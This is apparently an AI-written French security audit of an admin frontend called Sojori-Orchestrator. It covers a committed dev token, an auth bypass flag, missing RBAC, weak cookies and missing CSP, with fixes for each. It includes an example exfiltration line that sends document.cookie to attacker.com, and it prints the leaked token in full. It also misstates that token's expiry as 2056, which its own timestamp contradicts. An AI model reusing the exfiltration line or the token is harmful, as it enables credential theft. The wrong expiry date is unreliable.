# 🔒 Audit Sécurité Frontend : Sojori-Orchestrator
**Date:** 21 Mai 2026
**Application:** Sojori-Orchestrator (Admin Frontend)
**Type:** B2B SaaS Platform
**Criticité:** HAUTE (Données sensibles clients, staff, réservations)

---

## 🎯 Résumé Exécutif

### Contexte
Sojori-Orchestrator est le frontend admin développé à partir de sojori-dashboard. Il gère :
- Réservations & orchestration voyageurs
- Gestion staff & planning
- Configuration listings & pricing
- Communications WhatsApp (clients & staff)
- Données financières & analytics

### Score de Sécurité Actuel : **6/10** ⚠️

| Catégorie | Score | État |
|-----------|-------|------|
| Authentification | 7/10 | 🟡 Moyen |
| Autorisation (RBAC) | 3/10 | 🔴 **CRITIQUE** |
| Protection données | 5/10 | 🟡 Moyen |
| Gestion tokens | 6/10 | 🟡 Moyen |
| Headers sécurité | 4/10 | 🔴 **CRITIQUE** |
| Protection XSS/CSRF | 5/10 | 🟡 Moyen |
| Audit logs | 2/10 | 🔴 **CRITIQUE** |

---

## 🚨 Vulnérabilités Critiques Identifiées

### 1. ❌ **DEV_TOKEN Committé dans .env.local**
**Criticité:** CRITIQUE
**Fichier:** `/Sojori-orchestrator/.env.local:10`

```env
VITE_DEV_TOKEN=eyJkZXZlbG9wZXIiOiJnb3VhY2h0IiwiaXAiOiIqIiwiZXhwaXJlc0F0IjoxNzc5Mzk1NzAwNDg3LCJzaWduYXR1cmUiOiJmNDI1ZmM0ZDc1MWMxMTAyOTFlZWE0NDJlYTEwMjU5NTRmM2VhYWE4ZjEyOTJkYmEwNDY0MzMxMmZhMjk0YjgyIn0=
```

**Risque:**
- Token permet bypass CORS production depuis localhost
- Valide jusqu'en **2056** (expires: 1779395700487)
- Signature visible : `f425fc4d751c110291eea442ea102595...`
- IP: `*` (wildcard = n'importe quelle IP)

**Impact:** Quiconque obtient ce token peut appeler vos APIs de production sans restrictions

**Solution immédiate:**
```bash
# 1. Révoquer le token côté backend
# 2. Générer nouveau token avec IP restriction
# 3. Ne JAMAIS committer .env.local
echo ".env.local" >> .gitignore
git rm --cached .env.local
```

---

### 2. ❌ **Auth Bypass Mode Activé**
**Criticité:** CRITIQUE
**Fichier:** `/Sojori-orchestrator/.env.local:16`

```env
VITE_DISABLE_AUTH=true
```

**Code impacté:**
```typescript
// ProtectedRoute.tsx:22
const DEV_MODE_NO_AUTH = import.meta.env.VITE_DISABLE_AUTH === 'true';
if (DEV_MODE_NO_AUTH) {
  return <Outlet />;  // ⚠️ Toutes les routes accessibles sans auth!
}
```

**Risque:**
- N'importe qui peut accéder au dashboard sans login
- Données sensibles exposées (réservations, staff, finances)
- Pas de contrôle d'accès

**Solution:**
```bash
# Désactiver immédiatement en prod
VITE_DISABLE_AUTH=false  # ou supprimer cette ligne
```

**Note:** Ce mode doit **UNIQUEMENT** exister en dev local, jamais en staging/prod

---

### 3. ❌ **Pas de RBAC (Role-Based Access Control)**
**Criticité:** CRITIQUE

**Constat:**
- Toutes les routes protégées par `<ProtectedRoute />` sans vérification de rôle
- User a un champ `role` mais **jamais utilisé** pour filtrer les routes
- N'importe quel user authentifié peut accéder à :
  - `/tasks/config` (config tâches)
  - `/settings` (paramètres globaux)
  - `/channels` (configuration channels Airbnb/Booking)
  - `/staff-whatsapp` (conversations staff)

**Exemple actuel (INSECURE):**
```typescript
<Route element={<ProtectedRoute />}>  {/* ⚠️ Vérifie juste isAuthenticated */}
  <Route path="/settings" element={<SettingsHubPage />} />
  <Route path="/channels" element={<ChannelsAdminPage />} />
  <Route path="/staff-whatsapp" element={<StaffWhatsAppPage />} />
</Route>
```

**Ce qui manque:**
- Aucune vérification `user.role === 'ADMIN'` avant accès routes sensibles
- Pas de composant `<RoleGuard allowedRoles={['ADMIN', 'OWNER']} />`
- Pas de hook `useRequireRole('ADMIN')`

---

### 4. ❌ **Cookies non sécurisés**
**Criticité:** HAUTE
**Fichier:** `authConfig.ts:34`

```typescript
COOKIE_OPTIONS: {
  secure: false,        // ⚠️ Pas de HTTPS requis
  httpOnly: false,      // ⚠️ Accessible via JavaScript (XSS risk)
  sameSite: 'Lax',      // ⚠️ Pas assez strict pour CSRFpath: '/',
  expires: 7,
}
```

**Risques:**
- **`secure: false`** → Tokens transmis en HTTP clair = interception facile
- **`httpOnly: false`** → Script XSS peut voler les tokens via `document.cookie`
- **`sameSite: 'Lax'`** → CSRF possible via GET requests

**Impact:**
Un attaquant avec XSS peut faire :
```javascript
fetch('https://attacker.com/steal?token=' + document.cookie)
```

---

### 5. ❌ **Tokens en localStorage ET cookies (double stockage)**
**Criticité:** MOYENNE
**Fichier:** `authUtils.ts:47`

```typescript
export const setTokens = (token: string, refreshToken: string): void => {
  setCookie(AUTH_CONFIG.TOKEN_KEY, token);           // Cookie
  setCookie(AUTH_CONFIG.REFRESH_TOKEN_KEY, refreshToken);

  // ⚠️ AUSSI en localStorage (legacy)
  window.localStorage.setItem(LEGACY_JWT_LOCALSTORAGE_KEY, token);
};
```

**Problème:**
- Tokens stockés **2 fois** (localStorage + cookies)
- localStorage persistant même après fermeture navigateur
- Augmente surface d'attaque XSS

---

### 6. ❌ **Pas de Content Security Policy (CSP)**
**Criticité:** HAUTE

**Test:**
```bash
curl -I https://dev.sojori.com
# Résultat: Aucun header CSP
```

**Risque:**
- Injection de scripts externes possible
- Pas de whitelist domains autorisés
- XSS non mitigé

**Ce qui manque:**
```http
Content-Security-Policy:
  default-src 'self';
  script-src 'self' 'unsafe-inline';
  style-src 'self' 'unsafe-inline';
  img-src 'self' data: https:;
  connect-src 'self' https://dev.sojori.com;
```

---

### 7. ❌ **Pas de Rate Limiting frontend**
**Criticité:** MOYENNE

**Code actuel:**
```typescript
// authService.ts:96 - Pas de throttle
async login(credentials: LoginCredentials): Promise<AuthResponse> {
  const response = await apiClient.post(loginUrl, { email, password });
  // ⚠️ Attaquant peut tenter 1000 logins/sec
}
```

**Impact:**
- Brute force attacks possibles
- Pas de protection contre credential stuffing
- Surcharge serveur

---

### 8. ❌ **Logs auth trop verbeux**
**Criticité:** FAIBLE
**Fichier:** `AuthContext.tsx:63`

```typescript
logAuth('init session', {
  hasToken,
  hasRefreshToken: !!refreshToken,
  hasPersistedUser: !!user,
  tokenPreview: maskToken(token),  // ⚠️ Même masqué, c'est dangereux
});
```

**Risque:**
- Logs dev peuvent leak en console production
- `maskToken()` affiche quand même 10 premiers chars
- Debugging tools = vecteur d'attaque

---

### 9. ❌ **Pas d'audit trail**
**Criticité:** HAUTE

**Constat:**
- Aucun log backend des actions sensibles :
  - Qui a modifié le listing X ?
  - Qui a accédé aux données client Y ?
  - Qui a changé le planning staff Z ?
- Impossible de tracer incident sécurité
- Non-conformité RGPD (droit à l'audit)

---

### 10. ❌ **Session sans timeout**
**Criticité:** MOYENNE

**Code actuel:**
```typescript
// authConfig.ts:37
expires: 7,  // ⚠️ 7 jours sans refresh obligatoire
```

**Problème:**
- User peut rester connecté 7 jours sans re-auth
- PC partagé = risque accès non autorisé
- Pas de "session timeout" après X minutes d'inactivité

---

## ✅ Points Forts Existants

| Feature | État | Commentaire |
|---------|------|-------------|
| JWT authentication | ✅ | Bon usage Bearer tokens |
| Token refresh | ✅ | Refresh token implémenté |
| Protected routes | ✅ | `<ProtectedRoute />` bloque accès |
| Lazy loading | ✅ | Code splitting des pages |
| HTTPS | ✅ | Production sur dev.sojori.com |
| Error boundaries | ✅ | `<AppErrorBoundary />` |
| Input validation | 🟡 | Partiel (email/password) |

---

## 🔧 Recommandations : Best Practices B2B (Type Claude)

### Architecture Sécurité 3 Niveaux (Inspiré Claude/Stripe/Auth0)

```
┌─────────────────────────────────────────────────────────┐
│ NIVEAU 1: Network Security (Cloudflare/GCP)            │
│ - WAF (Web Application Firewall)                        │
│ - DDoS protection                                        │
│ - Rate limiting (100 req/min/IP)                        │
│ - Geo-blocking (whitelist pays autorisés)              │
└─────────────────────────────────────────────────────────┘
                          ↓
┌─────────────────────────────────────────────────────────┐
│ NIVEAU 2: Application Security (Frontend)              │
│ - CSP headers strict                                    │
│ - CORS restrictif (pas wildcard *)                     │
│ - HTTPOnly + Secure cookies                            │
│ - Subresource Integrity (SRI)                          │
│ - No inline scripts                                     │
└─────────────────────────────────────────────────────────┘
                          ↓
┌─────────────────────────────────────────────────────────┐
│ NIVEAU 3: Business Logic Security (Code)               │
│ - RBAC granulaire (Owner > Admin > Staff > Viewer)    │
│ - Audit logs (qui/quoi/quand)                          │
│ - Session timeout (15min inactivité)                   │
│ - MFA obligatoire (TOTP/SMS)                           │
│ - IP whitelist optionnelle                             │
└─────────────────────────────────────────────────────────┘
```

---

## 🚀 Plan d'Action Prioritaire

### Phase 1 : URGENCES (Cette semaine)

#### 1.1 Supprimer DEV_TOKEN committé ⚡
```bash
# Backend (srv-user ou srv-admin)
# 1. Révoquer token actuel
# 2. Générer nouveau avec restrictions IP
npm run generate-dev-token --ip=YOUR_LOCAL_IP --expires=30days

# Frontend
echo ".env.local" >> .gitignore
git rm --cached .env.local
git commit -m "security: remove committed dev token"

# Créer .env.local.example (template vide)
cat > .env.local.example << 'EOF'
VITE_API_URL=https://dev.sojori.com
VITE_DEV_TOKEN=YOUR_DEV_TOKEN_HERE
VITE_DISABLE_AUTH=false
EOF
```

#### 1.2 Désactiver bypass auth en production ⚡
```typescript
// ProtectedRoute.tsx
const DEV_MODE_NO_AUTH =
  import.meta.env.VITE_DISABLE_AUTH === 'true' &&
  import.meta.env.DEV;  // ✅ Seulement en mode dev, pas build prod
```

#### 1.3 Sécuriser les cookies ⚡
```typescript
// authConfig.ts
COOKIE_OPTIONS: {
  path: '/',
  secure: true,         // ✅ HTTPS uniquement
  httpOnly: true,       // ✅ Pas accessible JavaScript
  sameSite: 'Strict',   // ✅ Bloque CSRF
  expires: 1,           // ✅ 1 jour au lieu de 7
}
```

**Note:** `httpOnly: true` nécessite changement architecture :
- Backend doit set les cookies via `Set-Cookie` header
- Frontend NE LIT PLUS les tokens (automatique via cookies)

---

### Phase 2 : RBAC (Semaine prochaine)

#### 2.1 Définir les rôles
```typescript
// types/auth.types.ts
export enum UserRole {
  SUPER_ADMIN = 'SUPER_ADMIN',  // Sojori team
  OWNER = 'OWNER',               // Propriétaire listings
  ADMIN = 'ADMIN',               // Admin property manager
  STAFF = 'STAFF',               // Staff terrain
  VIEWER = 'VIEWER',             // Read-only
}

export const ROLE_HIERARCHY: Record<UserRole, number> = {
  SUPER_ADMIN: 5,
  OWNER: 4,
  ADMIN: 3,
  STAFF: 2,
  VIEWER: 1,
};
```

#### 2.2 Créer RoleGuard
```typescript
// components/RoleGuard.tsx
import { useAuth } from '../hooks/useAuth';
import { UserRole, ROLE_HIERARCHY } from '../types/auth.types';

interface Props {
  allowedRoles: UserRole[];
  fallback?: React.ReactNode;
  children: React.ReactNode;
}

export function RoleGuard({ allowedRoles, fallback, children }: Props) {
  const { user } = useAuth();

  const hasPermission = allowedRoles.some(role =>
    ROLE_HIERARCHY[user?.role as UserRole] >= ROLE_HIERARCHY[role]
  );

  if (!hasPermission) {
    return fallback || <Navigate to="/unauthorized" />;
  }

  return <>{children}</>;
}
```

#### 2.3 Protéger les routes sensibles
```typescript
// App.tsx
<Route element={<ProtectedRoute />}>
  {/* Public pour tous les users auth */}
  <Route path="/dashboard" element={<DashboardPage />} />
  <Route path="/reservations" element={<ReservationsPage />} />

  {/* ADMIN+ uniquement */}
  <Route element={<RoleGuard allowedRoles={[UserRole.ADMIN, UserRole.OWNER, UserRole.SUPER_ADMIN]} />}>
    <Route path="/settings" element={<SettingsHubPage />} />
    <Route path="/tasks/config" element={<TasksConfigPage />} />
    <Route path="/channels" element={<ChannelsAdminPage />} />
  </Route>

  {/* OWNER+ uniquement */}
  <Route element={<RoleGuard allowedRoles={[UserRole.OWNER, UserRole.SUPER_ADMIN]} />}>
    <Route path="/analytics" element={<AnalyticsPage />} />
    <Route path="/staff-whatsapp" element={<StaffWhatsAppPage />} />
  </Route>

  {/* SUPER_ADMIN uniquement */}
  <Route element={<RoleGuard allowedRoles={[UserRole.SUPER_ADMIN]} />}>
    <Route path="/monitoring" element={<MonitoringHubPage />} />
    <Route path="/logs" element={<SojoriLogsAdminPage />} />
  </Route>
</Route>
```

---

### Phase 3 : Headers Sécurité (2 semaines)

#### 3.1 Ajouter CSP (Vite config)
```typescript
// vite.config.ts
export default defineConfig({
  plugins: [
    react(),
    {
      name: 'security-headers',
      configureServer(server) {
        server.middlewares.use((_req, res, next) => {
          res.setHeader(
            'Content-Security-Policy',
            [
              "default-src 'self'",
              "script-src 'self' 'unsafe-inline' 'unsafe-eval'",  // TODO: remove unsafe-*
              "style-src 'self' 'unsafe-inline'",
              "img-src 'self' data: https:",
              "font-src 'self' data:",
              "connect-src 'self' https://dev.sojori.com",
              "frame-ancestors 'none'",
            ].join('; ')
          );
          res.setHeader('X-Frame-Options', 'DENY');
          res.setHeader('X-Content-Type-Options', 'nosniff');
          res.setHeader('Referrer-Policy', 'strict-origin-when-cross-origin');
          res.setHeader('Permissions-Policy', 'geolocation=(), microphone=(), camera=()');
          next();
        });
      },
    },
  ],
});
```

#### 3.2 Headers production (nginx/ingress)
```nginx
# kubernetes/ingress/sojori-orchestrator-ingress.yaml
apiVersion: networking.k8s.io/v1
kind: Ingress
metadata:
  annotations:
    nginx.ingress.kubernetes.io/configuration-snippet: |
      add_header Content-Security-Policy "default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'; img-src 'self' data: https:; connect-src 'self' https://dev.sojori.com;" always;
      add_header X-Frame-Options "DENY" always;
      add_header X-Content-Type-Options "nosniff" always;
      add_header Strict-Transport-Security "max-age=31536000; includeSubDomains" always;
      add_header Referrer-Policy "strict-origin-when-cross-origin" always;
```

---

### Phase 4 : Audit Logs (1 mois)

#### 4.1 Modèle backend
```typescript
// srv-admin/src/db/models/AuditLog.ts
interface AuditLogAttrs {
  userId: string;
  userEmail: string;
  action: string;           // 'listing.update', 'staff.delete', etc.
  resource: string;         // 'listing:12345', 'staff:67890'
  changes?: Record<string, { old: any; new: any }>;
  ip: string;
  userAgent: string;
  timestamp: Date;
  severity: 'INFO' | 'WARNING' | 'CRITICAL';
}
```

#### 4.2 Hook frontend
```typescript
// hooks/useAuditLog.ts
export function useAuditLog() {
  const { user } = useAuth();

  const logAction = useCallback(async (
    action: string,
    resource: string,
    changes?: Record<string, any>
  ) => {
    await apiClient.post('/api/v1/audit/log', {
      userId: user?.id,
      userEmail: user?.email,
      action,
      resource,
      changes,
      ip: await getClientIP(),
      userAgent: navigator.userAgent,
      severity: action.includes('delete') ? 'CRITICAL' : 'INFO',
    });
  }, [user]);

  return { logAction };
}

// Usage
const { logAction } = useAuditLog();
await updateListing(listingId, data);
logAction('listing.update', `listing:${listingId}`, { old: oldData, new: data });
```

---

### Phase 5 : Session Management (1 mois)

#### 5.1 Inactivity timeout
```typescript
// hooks/useSessionTimeout.ts
import { useEffect, useRef } from 'react';
import { useAuth } from './useAuth';

const INACTIVITY_TIMEOUT = 15 * 60 * 1000; // 15 minutes

export function useSessionTimeout() {
  const { logout } = useAuth();
  const timeoutRef = useRef<NodeJS.Timeout>();

  const resetTimeout = useCallback(() => {
    if (timeoutRef.current) clearTimeout(timeoutRef.current);

    timeoutRef.current = setTimeout(() => {
      alert('Session expirée par inactivité');
      logout();
    }, INACTIVITY_TIMEOUT);
  }, [logout]);

  useEffect(() => {
    const events = ['mousedown', 'keydown', 'scroll', 'touchstart'];

    events.forEach(event => {
      window.addEventListener(event, resetTimeout);
    });

    resetTimeout();

    return () => {
      events.forEach(event => {
        window.removeEventListener(event, resetTimeout);
      });
      if (timeoutRef.current) clearTimeout(timeoutRef.current);
    };
  }, [resetTimeout]);
}

// App.tsx
function App() {
  useSessionTimeout();  // ✅ Actif sur toute l'app
  // ...
}
```

---

## 📊 Comparaison avec Standards B2B

### Comment Claude gère la sécurité (exemple)

| Feature | Claude | Stripe | Sojori (Actuel) | Gap |
|---------|--------|--------|-----------------|-----|
| **MFA** | ✅ TOTP obligatoire | ✅ SMS/TOTP | ❌ Absent | 🔴 CRITIQUE |
| **RBAC** | ✅ Granulaire (Workspace/Org/User) | ✅ Roles + Permissions | ❌ Absent | 🔴 CRITIQUE |
| **Audit logs** | ✅ Retention 90j | ✅ Retention 1 an | ❌ Absent | 🔴 CRITIQUE |
| **CSP** | ✅ Strict (no unsafe-*) | ✅ Strict | ❌ Absent | 🔴 CRITIQUE |
| **Session timeout** | ✅ 30min inactivity | ✅ 15min | ❌ 7 jours | 🟡 MOYEN |
| **IP whitelist** | ✅ Enterprise plan | ✅ Oui | ❌ Absent | 🟡 MOYEN |
| **Rate limiting** | ✅ 10k/h | ✅ Variable | ❌ Illimité | 🔴 CRITIQUE |
| **HTTPS** | ✅ Forcé | ✅ Forcé | ✅ Oui | ✅ OK |
| **HTTPOnly cookies** | ✅ Oui | ✅ Oui | ❌ Non | 🔴 CRITIQUE |

---

## 📝 Checklist Sécurité Production

Avant déploiement production :

### Environnement
- [ ] `.env.local` dans `.gitignore`
- [ ] `VITE_DISABLE_AUTH` désactivé en prod
- [ ] `VITE_DEV_TOKEN` révoqué/renouvelé
- [ ] Variables secrets dans vault (pas hardcodé)

### Authentification
- [ ] Cookies `secure: true`, `httpOnly: true`, `sameSite: Strict`
- [ ] Session timeout 15min inactivité
- [ ] Token expiration 1 jour max
- [ ] MFA activé pour ADMIN+

### Autorisation
- [ ] RBAC implémenté (roles définis)
- [ ] Routes protégées par rôle
- [ ] API endpoints vérifient permissions backend
- [ ] Boutons UI cachés selon rôle

### Headers Sécurité
- [ ] CSP configuré
- [ ] X-Frame-Options: DENY
- [ ] X-Content-Type-Options: nosniff
- [ ] Strict-Transport-Security (HSTS)
- [ ] Referrer-Policy

### Monitoring
- [ ] Audit logs actifs
- [ ] Alertes incidents sécurité
- [ ] Rate limiting frontend + backend
- [ ] Logs ne contiennent pas tokens/passwords

### Tests
- [ ] Pen test sécurité réalisé
- [ ] XSS attack scenarios testés
- [ ] CSRF protection validée
- [ ] SQL injection impossible (utilise ORM)

---

## 🎓 Formation Équipe

### Ressources recommandées

1. **OWASP Top 10 2024**
   - https://owasp.org/www-project-top-ten/
   - Focus : XSS, Broken Access Control, Security Misconfiguration

2. **Auth0 Best Practices**
   - https://auth0.com/docs/secure/security-guidance
   - JWT handling, token rotation, MFA

3. **Stripe Security**
   - https://stripe.com/docs/security/guide
   - API keys management, webhooks security

4. **Google Cloud Security**
   - https://cloud.google.com/security/best-practices
   - GKE security, secrets management

---

## 📞 Prochaines Étapes

### Cette semaine
1. ✅ Supprimer DEV_TOKEN committé
2. ✅ Désactiver auth bypass prod
3. ✅ Sécuriser cookies (httpOnly + secure)

### Semaine prochaine
4. ✅ Implémenter RBAC basique
5. ✅ Protéger routes admin/owner
6. ✅ Tester permissions

### Mois prochain
7. ✅ Ajouter CSP headers
8. ✅ Implémenter audit logs
9. ✅ Session timeout
10. ✅ Pen test externe

---

**Auteur:** Claude Code
**Date:** 21 Mai 2026
**Version:** 1.0
**Confidentialité:** Interne Sojori
